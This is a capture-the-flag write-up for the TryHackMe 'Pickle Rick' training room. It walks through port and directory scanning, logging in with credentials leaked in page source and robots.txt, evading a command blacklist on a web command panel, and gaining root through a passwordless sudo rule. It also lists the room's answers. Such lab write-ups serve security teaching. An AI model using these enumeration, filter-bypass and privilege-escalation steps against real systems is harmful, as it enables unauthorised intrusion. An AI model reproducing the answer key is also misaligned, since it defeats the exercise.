# TryHackMe — Pickle Rick (`picklerick`) CTF Write-Up

## Overview
- **Room**: Pickle Rick ([`picklerick`](https://tryhackme.com/r/room/picklerick))
- **Difficulty**: Easy
- **Category**: Web Application Penetration Testing & Privilege Escalation
- **Scenario**: A Rick and Morty themed CTF machine. Rick turned himself into a pickle again! To brew the anti-pickle serum and turn Rick back into a human, we must exploit a vulnerable web server, bypass command execution filters, and escalate privileges to find three secret potion ingredients.

---

## Summary of Answers

| # | Question | Answer |
|---|---|---|
| **1** | What is the first ingredient Rick needs? | `mr. meeseek hair` |
| **2** | Whats the second ingredient in Rick's potion? | `1 jerry tear` |
| **3** | Whats the final ingredient Rick needs? | `fleeb juice` |

---

## Step-by-Step Walkthrough

### Phase 1: Reconnaissance & Web Enumeration
1. **Port Scanning**:
   ```bash
   nmap -sC -sV -p- -T4 <TARGET_IP>
   ```
   **Open Ports**:
   - `22/tcp` (OpenSSH 7.2p2 Ubuntu)
   - `80/tcp` (Apache httpd 2.4.18)

2. **Web Page Inspection**:
   - Inspecting the HTML source of `http://<TARGET_IP>/` reveals a developer comment:
     ```html
     <!-- Note to self, remember username! username: R1ckRul3s -->
     ```
   - Checking `http://<TARGET_IP>/robots.txt` yields a single string:
     ```text
     Wubbalubbadubdub
     ```
3. **Directory Enumeration**:
   Run Gobuster / Feroxbuster:
   ```bash
   gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
   ```
   Discovered endpoints:
   - `/login.php`
   - `/robots.txt`
   - `/portal.php`
   - `/denied.php`

---

### Phase 2: Exploitation & Command Injection Bypass
1. **Authentication**:
   Navigate to `http://<TARGET_IP>/login.php`:
   - **Username**: `R1ckRul3s`
   - **Password**: `Wubbalubbadubdub`

2. **Command Panel Execution**:
   Logging in redirects to `/portal.php`, which presents an interactive **Command Panel**.
   Testing commands:
   - `ls -la` lists files in `/var/www/html`:
     ```text
     -rw-r--r-- 1 www-data www-data   23 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
     -rw-r--r-- 1 www-data www-data  882 Feb 10  2019 clue.txt
     -rw-r--r-- 1 www-data www-data   17 Feb 10  2019 login.php
     -rw-r--r-- 1 www-data www-data 2040 Feb 10  2019 portal.php
     ```
   - Attempting `cat Sup3rS3cretPickl3Ingred.txt` returns `Command disabled to make it harder for future pickles`.

3. **Bypassing the Filter**:
   The web application filters the `cat` command, but multiple alternative Linux file viewers and utilities are unblocked:
   - Alternative 1: `less Sup3rS3cretPickl3Ingred.txt`
   - Alternative 2: `tac Sup3rS3cretPickl3Ingred.txt`
   - Alternative 3: `head -n 20 Sup3rS3cretPickl3Ingred.txt`
   - Alternative 4: `nl Sup3rS3cretPickl3Ingred.txt`
   - Or simply browsing to `http://<TARGET_IP>/Sup3rS3cretPickl3Ingred.txt`.

- **First Ingredient**: `mr. meeseek hair`

4. **Locating the Second Ingredient**:
   - Read `clue.txt`:
     ```bash
     less clue.txt
     # Output: Look around the file system for the other ingredient.
     ```
   - List home directories:
     ```bash
     ls -la /home
     ls -la /home/rick
     # Contains "second ingredient"
     ```
   - Read `/home/rick/second ingredient`:
     ```bash
     less "/home/rick/second ingredient"
     ```

- **Second Ingredient**: `1 jerry tear`

---

### Phase 3: Privilege Escalation
1. **Checking Sudo Privileges**:
   In the command panel, check the permissions for `www-data`:
   ```bash
   sudo -l
   ```
   **Output**:
   ```text
   User www-data may run the following commands on picklerick:
       (ALL) NOPASSWD: ALL
   ```
   `www-data` has full passwordless `sudo` rights on all binaries!

2. **Reading the Root Flag**:
   List and view the contents of `/root`:
   ```bash
   sudo ls -la /root
   # Discovers 3rd.txt
   sudo less /root/3rd.txt
   ```

- **Third Ingredient**: `fleeb juice`

---

## Key Takeaways
1. **Source Code & Robots.txt Hygiene**: Sensitive credentials and username hints should never be left in client-side HTML comments or `robots.txt`.
2. **Command Blacklisting vs. Whitelisting**: Blacklisting commands like `cat` is easily defeated using alternative utilities (`less`, `tac`, `nl`, `tail`, `strings`, `awk`, `base64`).
3. **Misconfigured Sudo Permissions**: Granting `(ALL) NOPASSWD: ALL` to the web server user allows immediate root system takeover.
